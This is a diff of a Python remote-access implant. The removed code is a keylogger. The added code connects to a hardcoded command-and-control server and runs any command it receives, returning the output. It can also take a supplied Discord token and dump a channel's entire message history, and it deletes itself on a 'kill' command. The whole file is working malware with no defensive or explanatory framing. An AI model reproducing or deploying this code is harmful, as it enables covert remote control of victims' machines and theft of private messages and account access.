@@ -1,24 +1,37 @@
 import socket
 import subprocess
 import json
-import keyboard as kb
-import threading
+import os
+import discord
+import asyncio
 
-SERVER_IP = '172.31.89.246'
+SERVER_IP = '172.31.23.98'
 SERVER_PORT = 8080
 
-def log_key(event):
-    with open("key_log.txt", 'a') as f:
-        f.write(event.name)
-
-def start_logger():
-    kb.on_press(log_key)
-
-    while not stop_logger_flag.is_set(): pass
-
-    kb.unhook_all()
-
 client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+
+async def start_logging_messages(token, channel_id):
+    client = discord.Client(intents=discord.Intents.default())
+
+    async def get_messages():
+        channel = client.get_channel(channel_id)
+        client_socket.sendall(f"Got channel {channel}".encode())
+
+        if channel:
+            messages = open('messages.txt', 'w')
+
+            async for message in channel.history(limit=None):
+                messages.write(f'{message.author}: {message.content}\n')
+                client_socket.sendall("Wrote messages".encode())
+
+    # Event handler for when the bot is ready
+    @client.event
+    async def on_ready():
+        client_socket.sendall(f'Logged in as {client.user}'.encode())
+        await get_messages()
+        await client.close()
+
+    await client.start(token)
 
 while True:
     try:
@@ -28,33 +41,31 @@ while True:
         pass
 
 while True:
-    data = client_socket.recv(1024).decode()
+    data = client_socket.recv(1024).decode().split(' ')
 
     if not data:
         break
 
-    if data == "log key presses":
-        client_socket.sendall("Starting key logger".encode())
-        stop_logger_flag = threading.Event()
-        logger_thread = threading.Thread(target=start_logger)
-        logger_thread.start()
+    if data[0] == "kill":
         client_socket.sendall("Done".encode())
-    
-    if data == "stop key logger":
-        client_socket.sendall("Stopping key logger".encode())
-        stop_logger_flag.set()
-        logger_thread.join()
+        client_socket.close()
+        os.remove("implant.py")
+    elif data[0] == "get":
+        id = int(data[1])
+        token = str(data[2])
+
+        client_socket.sendall("Starting discord message logger".encode())
+        asyncio.run(start_logging_messages(token, id))
+        client_socket.sendall("Closed discord client".encode())
         client_socket.sendall("Done".encode())
+    else: # any linux command
+        p = subprocess.Popen(data, stdout=subprocess.PIPE)
+        output = []
 
-    # p = subprocess.Popen(data.split(' '), stdout=subprocess.PIPE)
-    # output = []
+        for i in p.stdout.readlines():
+            output.append(i.decode().strip())
 
-    # for i in p.stdout.readlines():
-    #     output.append(i.decode().strip())
+        if len(output) != 0:
+            client_socket.sendall(json.dumps(output).encode())
 
-    # if output == []:
-    #     output = "Done"
-
-    # client_socket.sendall(json.dumps(output).encode())
-
-print("Connection closed")
+        client_socket.sendall("Done".encode())
